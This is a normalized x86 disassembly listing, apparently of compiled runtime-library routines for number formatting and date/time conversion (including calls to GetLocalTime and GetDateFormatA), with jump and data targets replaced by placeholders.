push 0x0
push ecx
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
mov ebx [ ebp - 0x4 ]
call sub_405524
pop ecx
pop ebx
xchg edx eax
add dl 0x30
cmp dl 0x3a
jb r-xdata
lea ecx [ ebp - 0x51 ]
sub ecx esi
mov edx [ ebp - 0x24 ]
cmp edx 0x10
jbe r-xdata
sub edx ecx
jbe r-xdata
retn
retn
add ecx edx
mov al 0x30
dec esi
mov [ esi ] al
dec edx
jne r-xdata
sub_40951a
mov ecx 0xa
lea esi [ ebp - 0x61 ]
dec esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
add dl 0x30
cmp dl 0x3a
jb r-xdata
lea ecx [ ebp - 0x61 ]
sub ecx esi
mov edx [ ebp - 0x24 ]
cmp edx 0x10
jbe r-xdata
sub edx ecx
jbe r-xdata
retn
retn
add ecx edx
mov al 0x30
dec esi
mov [ esi ] al
dec edx
jne r-xdata
sub_4096b0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408f90
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_40929c
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4096f0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408f90
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_40929c
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_409744
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_4046e4
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_4046e4
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_4046e4
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_40929c
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_40451c
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_40442c
mov eax esi
mov edx ebx
call sub_404a68
mov eax [ ebp - 0x4 ]
call sub_4046e4
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_40929c
mov edx esi
xchg edx eax
call sub_404a68
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_409804
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_409848
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_409b20
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_409947
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_409951
call sub_409947
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
xor ecx ecx
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_409804
retn
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_4099af
call sub_409947
call sub_40993e
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_40993e
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jb r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_409804
retn
xor ecx ecx
sub_4099eb
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_40993e
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_40993e
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_409a50
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_409aa4
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_4099eb
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_409b20
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_409b4d
jmp r-xdata
call sub_409c6f
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_409b4d
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_403210
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_409c6f
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_409d4c
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_409d90
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_409e00
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_409d90
test al al
jne r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_408560
sub_409e40
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_409d4c
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_408544
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_408544
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_408544
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409e9c
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_409ed8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_409e9c
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409fa0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_409ed8
test al al
jne r-xdata
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_408560
sub_409fd0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_409d4c
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_408544
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_408544
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_408544
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_409e9c
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_40a11c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409fd0
pop esi
pop ecx
pop ebp
retn 0x8
sub_40a13c
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
lea ecx [ ebx + 0x6 ]
lea edx [ ebx + 0x2 ]
mov eax ebx
call sub_409fd0
dec [ ebx + 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebx + 0xe ]
push eax
lea ecx [ ebx + 0xc ]
lea edx [ ebx + 0xa ]
lea eax [ ebx + 0x8 ]
call sub_409e40
pop ebx
pop ebp
retn 0x8
sub_40a17c
push ebx
add esp 0xfffffff8
mov ebx eax
mov cx [ ebx + 0x6 ]
mov dx [ ebx + 0x2 ]
mov ax [ ebx ]
call sub_409fa0
fstp [ esp ]
fwait
fld [ esp ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
mov ax [ ebx + 0xe ]
push eax
mov cx [ ebx + 0xc ]
mov dx [ ebx + 0xa ]
mov ax [ ebx + 0x8 ]
call sub_409e00
fsubr [ esp ]
fstp [ esp ]
fwait
mov ax [ ebx + 0xe ]
push eax
mov cx [ ebx + 0xc ]
mov dx [ ebx + 0xa ]
mov ax [ ebx + 0x8 ]
call sub_409e00
fadd [ esp ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_40a1ec
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_409d4c
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_40a214
add esp 0xffffffe0
lea eax [ esp + 0x8 ]
push eax
call GetLocalTime
mov cx [ esp + 0xe ]
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_409fa0
fstp [ esp + 0x18 ]
fwait
mov ax [ esp + 0x16 ]
push eax
mov cx [ esp + 0x18 ]
mov dx [ esp + 0x16 ]
mov ax [ esp + 0x14 ]
call sub_409e00
fadd [ esp + 0x18 ]
fstp [ esp ]
fwait
fld [ esp ]
add esp 0x20
retn
sub_40a264
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
fld [ ebx ]
call sub_402ac4
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
fild [ ebp - 0x8 ]
fstp [ ebx ]
fwait
fld [ ebx ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
fld [ ebp + 0x8 ]
call sub_402a94
fabs
fsubr [ ebx ]
fstp [ ebx ]
fwait
fld [ ebp + 0x8 ]
call sub_402a94
fabs
fadd [ ebx ]
fstp [ ebx ]
fwait
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_40a2b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push [ ebx + 0x4 ]
push [ ebx ]
lea eax [ ebp - 0x8 ]
call sub_40a264
mov eax [ ebp - 0x8 ]
mov [ ebx ] eax
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x4 ] eax
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_40a300
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028fc
sub_40a344
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4046e4
mov edx eax
mov eax ebx
call sub_40a300
pop ecx
pop ebx
pop ebp
retn
sub_40a364
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_40929c
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40a300
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a3b0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_40a3dc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_40a11c
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_40a414
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_409e40
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_40a454
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a5a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40442c
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4044c4
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4048dc
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a5a9
lea eax [ ebp - 0x118 ]
call sub_40442c
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404694
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_4046e4
mov edx eax
mov eax [ ebx ]
call sub_40c858
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c9cc
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_40493c
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c968
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_40461c
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c9cc
mov ecx eax
mov eax ebx
mov edx esi
call sub_40451c
sub_40a5bc
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a69a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40442c
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4044c4
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4044c4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a6a1
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404694
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4048dc
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_4046e4
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_40493c
sub_40a6c4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
